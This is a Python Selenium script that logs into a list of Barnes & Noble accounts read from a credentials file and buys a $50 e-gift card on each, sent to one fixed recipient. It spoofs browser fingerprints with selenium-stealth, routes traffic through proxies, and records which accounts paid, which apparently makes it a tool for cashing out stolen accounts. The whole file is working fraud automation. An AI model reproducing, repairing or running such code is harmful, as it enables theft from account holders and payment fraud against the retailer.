from seleniumwire import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium_stealth import stealth
import colorama #colors
import random #interval for purchases
import time #sleep

colorama.init(autoreset = True)

INTERVAL_MIN = 50
INTERVAL_MAX = 75
RECEIPIENT = ""
BINARY_PATH = r""
USER_PROFILE_PATH = r""
DRIVER_PATH = r""

class Purchaser:
    
    def __init__(self, accounts, receipient, proxies):
        self.accounts = accounts
        self.receiptient = receipient
        self.proxies = proxies

    def writeToFile(self, account, amount):

        with open("purchased.txt", "a+") as writer:
            writer.write(f"{account} | ${amount}\n")
    
    def startInstance(self):
        option = webdriver.ChromeOptions()

        option.binary_location = BINARY_PATH
        
        #add a profile
        option.add_argument(USER_PROFILE_PATH)
        #suppress info messages
        option.add_argument('log-level=3')

        #add proxy
        proxyOptions = {
            'proxy': {
            'https': '',
        }
        }

        driver = webdriver.Chrome(DRIVER_PATH, options = option, seleniumwire_options = proxyOptions if proxyOptions['https'] != None else None)
        
        stealth(driver,
                languages = ["en-US", "en"],
                vendor = "Google Inc.",
                platform = "Win32",
                webgl_vendor = "Intel Inc.",
                renderer = "Intel Iris OpenGL Engine",
                fix_hairline = True,
        )        

        driver.maximize_window()

        return driver

        
    def buyGiftCard(self, driver, amount):
        
        driver.get("https://www.barnesandnoble.com/b/gift-cards/_/N-8rg")

        WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, '/html/body/main/div[2]/div[1]/div/div[2]/div/div[2]/div/div/div[2]/div[1]/a[5]/figure/img'))).click()

        driver.find_element_by_xpath('//*[@id="cardValue"]').send_keys(amount)

        driver.find_element_by_xpath('//*[@id="cardEmail"]').send_keys(RECEIPIENT)

        driver.find_element_by_xpath('//*[@id="cardEmailConfirm"]').send_keys(RECEIPIENT)

        driver.find_element_by_xpath('//*[@id="cardMessage"]').send_keys('happy bday')

        WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, '//*[@id="gcSubmitHidden"]'))).click()

        WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, '//*[@id="viewShoppingBag"]'))).click()

        WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.CSS_SELECTOR, '#continue'))).click()

    def logoutRitual(self, driver, close = True):
        driver.get("https://www.barnesandnoble.com/logout.jsp")

        driver.delete_all_cookies()

        if close:

            driver.close()

    def login(self, driver, email, password):
        driver.get("https://www.barnesandnoble.com/")
        
        #log out in case script was running and it crashed leaving an account logged in
        if driver.get_cookie('USER_FIRST_NAME') is not None:
            self.logoutRitual(driver, close = False)

        WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, '//*[@id="navbarDropdown"]'))).click()

        WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, '/html/body/div[2]/header/nav/div/div[2]/ul[2]/li[1]/div/dd/a[1]'))).click()

        time.sleep(10)

        #simulate a user scroll
        driver.execute_script("window.scrollTo(0, 1080)") 

        WebDriverWait(driver, 20).until(EC.frame_to_be_available_and_switch_to_it(driver.find_element_by_xpath('/html/body/div[17]/div/iframe')))
        
        driver.find_element_by_id('email').send_keys(email)
        driver.find_element_by_xpath('//*[@id="password"]').send_keys(password)

        WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, '/html/body/div[2]/form/div[1]/div[4]/div/div/button'))).click()

    def purchase(self):
        
        for account in self.accounts:

            driver = self.startInstance()

            account = account.split(":")

            amount = 50

            self.login(driver, account[0], account[1])

            time.sleep(30)

            if driver.get_cookie('USER_FIRST_NAME') is not None:
                print(f"Logged in with -> {colorama.Fore.LIGHTBLUE_EX}{account[0]}")

            else:
                print(f"Failed to log in with -> {colorama.Fore.RED}{account[0]}")

                driver.close()

                continue

            time.sleep(5)

            self.buyGiftCard(driver, amount)

            #switch back to default iframe
            driver.switch_to.default_content()

            time.sleep(3)

            #simualte a user scroll
            driver.execute_script("window.scrollTo(0, 1080)")

            try:
                WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, '//*[@id="memberSubmitOrder"]'))).click()
            except:
                print(f"CVV required on -> {colorama.Fore.RED}{account[0]}")
                self.logoutRitual(driver)

                continue
            
            time.sleep(50)

            if "thank-you" not in driver.current_url:

                print(f"Card declined on -> {colorama.Fore.RED}{account[0]}")

                self.logoutRitual(driver)

                continue

            self.writeToFile(f"{account[0]}:{account[1]}", amount)

            print(f"Purchase made on -> {colorama.Fore.LIGHTBLUE_EX}{account[0]}")

            self.logoutRitual(driver)

def main():

    purchaser = Purchaser([account.strip("\n") for account in open("accounts.txt")], RECEIPIENT, [proxy.strip("\n") for proxy in open("proxiess.txt")])

    purchaser.purchase()


if __name__ == "__main__":
    main()
